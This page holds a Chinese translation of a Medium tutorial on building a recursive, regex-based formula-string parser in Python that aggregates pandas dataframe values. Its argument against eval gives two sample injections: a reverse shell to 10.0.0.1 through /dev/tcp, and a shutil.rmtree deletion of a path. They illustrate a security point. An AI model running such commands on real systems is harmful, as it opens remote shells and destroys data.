<html>
<head>
<title>How to Write a Formula String Parser in Python</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">如何用Python编写公式字符串解析器</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/how-to-write-a-formula-string-parser-in-python-5362210afeab?source=collection_archive---------1-----------------------#2020-02-09">https://levelup.gitconnected.com/how-to-write-a-formula-string-parser-in-python-5362210afeab?source=collection_archive---------1-----------------------#2020-02-09</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><figure class="is it gp gr iu iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi ir"><img src="../Images/d689ba7a76cb298c0b2b84673780a986.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*v6SavzadaUQ05McT"/></div></div><figcaption class="jc jd gj gh gi je jf bd b be z dk translated">Antoine Dautry 在<a class="ae jg" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><div class=""/><div class=""><h2 id="6f17" class="pw-subtitle-paragraph kg ji jj bd b kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx dk translated">解释字符串格式的公式以执行它</h2></div><p id="9f9a" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">那么，我这里说的“公式串”是什么意思呢？我们可以将“a + (b + c)”作为字符串读取，然后用Python解释它，而不是将<code class="fe lu lv lw lx b">a + (b + c)</code>作为代码，包括:</p><ul class=""><li id="0eac" class="ly lz jj la b lb lc le lf lh ma ll mb lp mc lt md me mf mg bi translated">了解基本运算符<code class="fe lu lv lw lx b">+</code>、<code class="fe lu lv lw lx b">-</code>、<code class="fe lu lv lw lx b">*</code>、<code class="fe lu lv lw lx b">/</code></li><li id="5b16" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated">理解计算优先级，比如<code class="fe lu lv lw lx b">*</code>和<code class="fe lu lv lw lx b">/</code>应该在任何<code class="fe lu lv lw lx b">+</code>和<code class="fe lu lv lw lx b">-</code>之前计算。</li><li id="1137" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated">理解与计算优先级相关的括号。</li><li id="7f3e" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated">了解一些更高层次的算子比如sigma。这里我们用<code class="fe lu lv lw lx b">sum()</code>、<code class="fe lu lv lw lx b">avg()</code>、<code class="fe lu lv lw lx b">min()</code>和<code class="fe lu lv lw lx b">max()</code>。</li><li id="f3cf" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated">最后，能够根据变量名找到正确的值，在上面的例子中是<code class="fe lu lv lw lx b">a</code>、<code class="fe lu lv lw lx b">b</code>和<code class="fe lu lv lw lx b">c</code>。当然，在实践中，“变量”会更加复杂。</li></ul><p id="880b" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我的GitHub中的一个要点页面贴在本文末尾。所以，请允许我使用Jupyter Notebook中的截图来一步步实现，这样更容易阅读。</p><h1 id="6504" class="mm mn jj bd mo mp mq mr ms mt mu mv mw kp mx kq my ks mz kt na kv nb kw nc nd bi translated">为什么我们需要写一个解析器？</h1><p id="7f4d" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">在实现之前，我想讨论一下为什么我们需要编写一个解析器，尽管可能有其他方法可以做到这一点。</p><p id="f622" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">有些人可能认为<code class="fe lu lv lw lx b">eval</code>函数可以做到这一点。</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/c18f2d1ebd36bb262d2db19caeeede0c.png" data-original-src="https://miro.medium.com/v2/resize:fit:572/format:webp/1*PTPTZUZL0uuF5noLSa2_jQ.png"/></div></figure><p id="6b84" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">然而，事实证明<code class="fe lu lv lw lx b">eval</code>函数非常危险，只能用于实验目的，不应该出现在生产环境中。</p><h2 id="cf58" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">原因1:黑客可以运行任何表达式</h2><p id="9e65" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">一旦黑客意识到Python程序正在读取一些字符串并在<code class="fe lu lv lw lx b">eval</code>函数中运行它们，那么这个安全漏洞几乎可以用来运行任何东西。</p><p id="55b6" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">例如，运行一些恶意命令，如</p><pre class="nk nl nm nn gt oa lx ob oc aw od bi"><span id="66b4" class="no mn jj lx b gy oe of l og oh">eval("__import__('os').system('bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1')#")</span></pre><p id="3a35" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">运行一些危险的命令来删除你的重要文件</p><pre class="nk nl nm nn gt oa lx ob oc aw od bi"><span id="8331" class="no mn jj lx b gy oe of l og oh">eval("__import__('<!-- -->shutil'<!-- -->)<!-- -->.rmtree('/an/important/path/')"<!-- -->)</span></pre><h2 id="72fa" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">原因2:它违反了软件开发的基本原则</h2><p id="a4b8" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">也就是说，您的源代码应该包含所有的特性和功能。它依赖于一些额外的静态源作为你程序的一部分，这很容易变得失去控制，并且功能将不再是可预期的。</p><h2 id="9a3c" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">原因3:它导致可维护性差</h2><p id="5ff8" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">无论我们写的代码有多糟糕，我们都可以重构它或者修复其中的错误。随着更多的“迭代”，我们的程序越来越接近“完美”。然而，使用<code class="fe lu lv lw lx b">eval</code>函数会让你的程序总是有一些超出正常测试生命周期的东西，这使得它永远不会走向“完美”。</p><h2 id="5962" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">原因4:性能降低</h2><p id="e94f" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">我们的程序在运行之前会被编译。然而，使用<code class="fe lu lv lw lx b">eval</code>函数会导致每次调用该函数时进行“动态”编译。所以，性能会更慢，而且从来没有执行时间的预期。</p><h1 id="1308" class="mm mn jj bd mo mp mq mr ms mt mu mv mw kp mx kq my ks mz kt na kv nb kw nc nd bi translated">问题说明</h1><p id="c9b2" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">现在，让我们具体说明要解决的问题。</p><p id="60e0" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">假设我们有这样一个熊猫数据帧，它被认为是我们的原始数据。</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi oi"><img src="../Images/99aba236e0d4055902874e49cdb3ac05.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-sw0MnK86j0boDXPbbxaLA.png"/></div></div></figure><p id="a042" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">现在，我们有了一个公式，比如<code class="fe lu lv lw lx b">sum(tag1)+sum(tag2)</code>，或者更复杂的公式，比如<code class="fe lu lv lw lx b">(sum(tag1)+avg(tag2))/avg(tag3)*100+max(tag4)-min(tag5)</code>。</p><p id="8d15" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我们的解析器应该识别公式中的所有数学表达式，然后从原始数据帧中获取值来执行计算。</p><p id="d4e2" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">注意，这个问题有一个隐藏的步骤。也就是说，每个标签有多个值，所以我们需要获取一个列表中的所有值，然后聚合这些值。</p><p id="d287" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">还预期需要涉及两种主要技术来解决该问题:</p><ul class=""><li id="73c5" class="ly lz jj la b lb lc le lf lh ma ll mb lp mc lt md me mf mg bi translated">正则表达式(regex)</li><li id="44e7" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated">递归函数</li></ul><h1 id="0b42" class="mm mn jj bd mo mp mq mr ms mt mu mv mw kp mx kq my ks mz kt na kv nb kw nc nd bi translated">履行</h1><p id="a14e" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">解决方案将会很复杂。所以，让我们一步一步来解决问题。</p><h2 id="8eaa" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">步骤1:仅聚合</h2><p id="cfc2" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">现在，让我们暂时忽略复杂的公式。假设公式只有一个标签值的聚合— <code class="fe lu lv lw lx b">sum(tag1)</code>。</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/40ac3cc5e97602f7997eea3df5ca8fa3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1322/format:webp/1*fwbBcmghNXmze4Ff2VhuPA.png"/></div></figure><p id="f20b" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这个递归函数使用regex的步骤如下:</p><ol class=""><li id="8487" class="ly lz jj la b lb lc le lf lh ma ll mb lp mc lt ok me mf mg bi translated">字符串<code class="fe lu lv lw lx b">sum(tag1)</code>不会匹配第一个<code class="fe lu lv lw lx b">if</code>条件，但会匹配第二个条件。在<code class="fe lu lv lw lx b">r’\Asum\([^\(\)]+\)\Z’</code>中，<code class="fe lu lv lw lx b">\A</code>将匹配字符串的开头，<code class="fe lu lv lw lx b">\Z</code>将匹配字符串的结尾，<code class="fe lu lv lw lx b">sum</code>将匹配字符串“sum”，而<code class="fe lu lv lw lx b">[^\(\)]+</code>将匹配一个或多个既不是<code class="fe lu lv lw lx b">(</code>也不是<code class="fe lu lv lw lx b">)</code>的字符，因为我们不希望它匹配类似于<code class="fe lu lv lw lx b">sum(tag1+(tag2-tag3))</code>的字符。</li><li id="6de2" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">然后，<code class="fe lu lv lw lx b">f[4:-1]</code>会将“sum(" from the beging and ")”从末尾剥离。因此，字符串<code class="fe lu lv lw lx b">tag1</code>将被传递给<code class="fe lu lv lw lx b">interpret</code>函数本身用于下一次递归。</li><li id="36bb" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">在下一次递归中，参数<code class="fe lu lv lw lx b">f</code>将是从上一次递归中传递过来的字符串<code class="fe lu lv lw lx b">tag1</code>，这将匹配正则表达式<code class="fe lu lv lw lx b">r’\Atag[\d]+\Z’</code>。</li><li id="ef4a" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">一旦匹配，函数将返回<code class="fe lu lv lw lx b">df[df.tag == 'tag1']['value'].values</code>到之前的递归，这是原始数据帧中tag1的所有值的数组。</li><li id="16da" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">前一次递归将对下一次递归返回的数组执行<code class="fe lu lv lw lx b">np.sum(...)</code>。因此，标量值将被返回。</li></ol><p id="686b" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">类似地，我们可以为其他3种类型的聚合添加更多的<code class="fe lu lv lw lx b">elif</code>条件。</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi ol"><img src="../Images/84ce174f20337046b727dfbddf44fd58.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CTASf4sroaB07sRhv394Xg.png"/></div></div></figure><h2 id="1795" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">步骤2:聚合之间的运算符</h2><p id="4292" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">现在，让我们在聚合之间添加运算符的支持，比如<code class="fe lu lv lw lx b">sum(tag1+tag2)</code>。</p><p id="d4cc" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">想法如下:</p><ol class=""><li id="5420" class="ly lz jj la b lb lc le lf lh ma ll mb lp mc lt ok me mf mg bi translated">从公式中找出任何运算符<code class="fe lu lv lw lx b">+, -, *, /</code>，然后将公式拆分成多个部分。</li><li id="462b" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">将组件发送到值的下一轮递归</li><li id="5718" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">在组件值之间使用相应的计算方法——加、减、乘或除</li></ol><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi om"><img src="../Images/8b07ad1de39738e133c1d7eb67ae91a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lZEZa4ibC7wOJoBBt1-nEQ.png"/></div></div></figure><p id="fae8" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">这里，我们使用正则表达式<code class="fe lu lv lw lx b">r’[\+\-]’</code>来拆分公式，得到两个分量:左分量和右分量。然后，这两个组件都被传递到下一级递归中以获取它们的值。之后，将根据两个分量之间的运算符计算这两个分量。</p><p id="1d00" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la jk">非常重要的提示:</strong></p><ul class=""><li id="443c" class="ly lz jj la b lb lc le lf lh ma ll mb lp mc lt md me mf mg bi translated">左边的组件必须是原子组件，其中没有更多的操作符。</li><li id="923f" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated">右边的组件可能有更多的操作符，但它将在下一级递归中被拆分。</li><li id="410f" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated">如果有，务必首先通过<code class="fe lu lv lw lx b">+, —</code>进行分割，这一点非常重要。然后，仅当没有剩余的<code class="fe lu lv lw lx b">+, —</code>时，由<code class="fe lu lv lw lx b">*, —</code>分割。这将确保<code class="fe lu lv lw lx b">*, —</code>的计算优先级高于<code class="fe lu lv lw lx b">+, —</code>。</li><li id="48a2" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated">在计算除法<code class="fe lu lv lw lx b">/</code>时，务必事先检查分母是否一致。</li></ul><h2 id="182c" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">步骤3:聚合中的运算符</h2><p id="23d3" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">我们的解析器应该足够智能来处理这样一个公式<code class="fe lu lv lw lx b">sum(tag1+tag2)+avg(tag3)</code>，相当于<code class="fe lu lv lw lx b">sum(tag1)+sum(tag2)+avg(tag3)</code>。</p><p id="73ef" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">在这种情况下，我们之前的<code class="fe lu lv lw lx b">interpret</code>函数会将公式<code class="fe lu lv lw lx b">sum(tag1+tag2)+avg(tag3)</code>分成两部分:</p><ul class=""><li id="36b1" class="ly lz jj la b lb lc le lf lh ma ll mb lp mc lt md me mf mg bi translated"><code class="fe lu lv lw lx b">sum(tag1</code></li><li id="a2f4" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt md me mf mg bi translated"><code class="fe lu lv lw lx b">tag2)+avg(tag3)</code></li></ul><p id="d42a" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">如果发生这种情况，整个功能将会失败。因此，我们需要找到一种方法来识别括号(可能是嵌套的)，然后匹配不在括号内的运算符。</p><p id="25ac" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">让我们修改我们的函数如下(在红色方块中):</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi on"><img src="../Images/1496ae40da32daeda6ec4b08db69bfc2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O5OcmreK7IPwNHoF_riStA.png"/></div></div></figure><p id="21f9" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><code class="fe lu lv lw lx b">remove_matched_parantheses</code>功能如下:</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/58afafbf0831e702c3761c3878c365e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/1*HiX_B7srMQ9AX-fFr2N5uw.png"/></div></figure><p id="0375" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">实施说明:</p><ol class=""><li id="a1f1" class="ly lz jj la b lb lc le lf lh ma ll mb lp mc lt ok me mf mg bi translated">删除任何匹配的括号对(如果有)</li><li id="787c" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">使用所有<code class="fe lu lv lw lx b">+, —</code>拆分公式。如果没有找到，使用<code class="fe lu lv lw lx b">*, /</code>分割</li><li id="1ef3" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">从最左边的组件开始，如果它包含括起来的括号(<code class="fe lu lv lw lx b">(</code>的数目等于<code class="fe lu lv lw lx b">)</code>)，这个组件就是左边的组件，右边的都是右边的组件。</li><li id="4868" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">如果没有括起来，就移动到下一个组件，直到找到括住括号的组件(可能是嵌套的)。然后，左边的所有组件应该连接为左组件，右边的所有组件都是右组件。</li></ol><p id="0c58" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la jk">为什么我们需要删除所有匹配的括号对？</strong></p><p id="d8a9" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">假设我们的公式是<code class="fe lu lv lw lx b">sum(tag1+tag2)*avg(tag3)</code>。如果我们不删除匹配的括号对，它将被分成<code class="fe lu lv lw lx b">sum(tag1</code>和<code class="fe lu lv lw lx b">tag2)*avg(tag3)</code>，因此我们的函数将失败。</p><p id="30f0" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">因此，如上所述，我们需要确保识别不在括号中的操作符。</p><p id="d55a" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我们还不能测试它。需要解决下一步才能验证。</p><h2 id="9949" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">第四步:添加关联规则的支持</h2><p id="cb31" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">处理<code class="fe lu lv lw lx b">sum(tag1+tag2)</code>时，如果<code class="fe lu lv lw lx b">tag1</code>的值的个数等于<code class="fe lu lv lw lx b">tag2</code>，当前版本的<code class="fe lu lv lw lx b">interpret</code>函数将不会出现问题。然而，如果我们想让我们的解释器函数通用化，我们不能假设。所以我们需要把<code class="fe lu lv lw lx b">sum(tag1+tag2)</code>重新写成<code class="fe lu lv lw lx b">sum(tag1)+sum(tag2)</code>。此外，我们需要考虑聚合函数中是否有嵌套括号。</p><p id="4543" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated"><strong class="la jk">注意:我们在一个</strong> <code class="fe lu lv lw lx b"><strong class="la jk">sum()</strong></code> <strong class="la jk">里面只能有</strong> <code class="fe lu lv lw lx b"><strong class="la jk">+, —</strong></code> <strong class="la jk">。</strong></p><p id="ade1" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">直觉:</p><ol class=""><li id="a86a" class="ly lz jj la b lb lc le lf lh ma ll mb lp mc lt ok me mf mg bi translated">获取聚合函数名，如<code class="fe lu lv lw lx b">sum</code></li><li id="122a" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">剥离外部聚合函数</li><li id="6e32" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">查找当前级别的所有运算符，即不在嵌套括号中的运算符。然后，使用这些运算符将字符串拆分成多个部分</li><li id="4987" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">对于每个组件，添加函数名(如<code class="fe lu lv lw lx b">sum(</code>)作为前缀，并在<code class="fe lu lv lw lx b">)</code>末尾加上括号</li><li id="e2fb" class="ly lz jj la b lb mh le mi lh mj ll mk lp ml lt ok me mf mg bi translated">将整个字符串传递给下一个递归</li></ol><p id="0b8b" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">代码如下:</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi op"><img src="../Images/9c98fa89576749b219bbeb2f51a24ede.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*98On0ja6HZixW1HRc-jzoQ.png"/></div></div></figure><p id="0370" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">现在，我们可以验证我们的工作。</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi oq"><img src="../Images/4eea40cf13d5880268c66070f01ac329.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*35xmUzi5WYWqS7M2pSDiQg.png"/></div></div></figure><h2 id="4925" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">步骤5:使用括号来更改优先级</h2><p id="4eb6" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">我们的解释器也应该认识到改变计算优先级的括号，比如这个公式</p><blockquote class="or"><p id="cf12" class="os ot jj bd ou ov ow ox oy oz pa lt dk translated"><code class="fe lu lv lw lx b">sum(tag1+(tag2-tag3))*(max(tag4)+avg(tag5))</code></p></blockquote><p id="a493" class="pw-post-body-paragraph ky kz jj la b lb pb kk ld le pc kn lg lh pd lj lk ll pe ln lo lp pf lr ls lt im bi translated">这一步的直觉是识别一对括起来的括号，然后去掉外面的括号，将内容传递给下一个递归。注意，我们应该只匹配以<code class="fe lu lv lw lx b">(</code>开始并以<code class="fe lu lv lw lx b">)</code>结束的模式，所以我们不应该匹配像<code class="fe lu lv lw lx b">sum(...)</code>这样的括号对。</p><p id="bb81" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">因此，我们简单地添加另一个<code class="fe lu lv lw lx b">elif</code>条件来匹配这个模式，并将内容传递给下一个递归。</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi pg"><img src="../Images/a7db99dba6017de356c17947144721e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6eWfj-7-rSjln3aa7jtclA.png"/></div></div></figure><p id="fbf7" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">另一件重要的事情是避免这里的无限递归。想想上面例子中的第一个sum函数<code class="fe lu lv lw lx b">sum(tag1+(tag2-tag3))</code>，我们之前的实现将把它重写为<code class="fe lu lv lw lx b">sum(tag1)+sum((tag2-tag3))</code>。然后，第二个组件<code class="fe lu lv lw lx b">sum((tag2-tag3))</code>将导致一个无限递归，因为它将不断向内容添加<code class="fe lu lv lw lx b">sum</code>。</p><p id="f1ac" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">下面的代码是为了避免这个问题。我们之所以应该使用<code class="fe lu lv lw lx b">while</code>循环而不是单个<code class="fe lu lv lw lx b">if</code>条件，是为了使函数对<code class="fe lu lv lw lx b">sum((((tag2-tag3))))</code>等情况更具鲁棒性。</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi ph"><img src="../Images/bf8121eba0e30a293afc883e834aa258.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ln6uD5kWny0vAoKB_XM35w.png"/></div></div></figure><p id="7306" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">现在，我们来验证一下。</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi pi"><img src="../Images/fd452619ee5bcec033a5644a8002f63d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*b4kBvkLQu-PkIdISaacn8Q.png"/></div></div></figure><h2 id="f763" class="no mn jj bd mo np nq dn ms nr ns dp mw lh nt nu my ll nv nw na lp nx ny nc nz bi translated">步骤6:添加对常量的支持</h2><p id="5a6d" class="pw-post-body-paragraph ky kz jj la b lb ne kk ld le nf kn lg lh ng lj lk ll nh ln lo lp ni lr ls lt im bi translated">有时，在公式中有一些常数是必要的。例如，在前一个示例的基础上，我们可以得到如下公式:</p><blockquote class="or"><p id="4758" class="os ot jj bd ou ov ow ox oy oz pa lt dk translated"><code class="fe lu lv lw lx b">(sum(tag1+(tag2-tag3))+10)*(max(tag4)+avg(tag5))*0.2</code></p></blockquote><p id="e2f5" class="pw-post-body-paragraph ky kz jj la b lb pb kk ld le pc kn lg lh pd lj lk ll pe ln lo lp pf lr ls lt im bi translated">这一步的直觉相对容易。我们只需要测试组件是否是一个数字。如果有，返回这个号码。</p><p id="1bd0" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">还有一个条件可以实现:</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi pj"><img src="../Images/e9c8c73f287cc80ec497a64aa0b8e528.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vD9oUt14nBMnVV5eKo1uBQ.png"/></div></div></figure><p id="c303" class="pw-post-body-paragraph ky kz jj la b lb lc kk ld le lf kn lg lh li lj lk ll lm ln lo lp lq lr ls lt im bi translated">我们来验证一下:</p><figure class="nk nl nm nn gt iv gh gi paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="gh gi pk"><img src="../Images/0afd38059b7aea0fa7415db5111e0a68.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z3zQGofYeNis_-C2wTVRfA.png"/></div></div></figure><div class="is it gp gr iu pl"><a href="https://medium.com/@qiuyujx/membership" rel="noopener follow" target="_blank"><div class="pm ab fo"><div class="pn ab po cl cj pp"><h2 class="bd jk gy z fp pq fr fs pr fu fw ji bi translated">通过我的推荐链接加入灵媒-陶</h2><div class="ps l"><h3 class="bd b gy z fp pq fr fs pr fu fw dk translated">作为一个媒体会员，你的会员费的一部分会给你阅读的作家，你可以完全接触到每一个故事…</h3></div><div class="pt l"><p class="bd b dl z fp pq fr fs pr fu 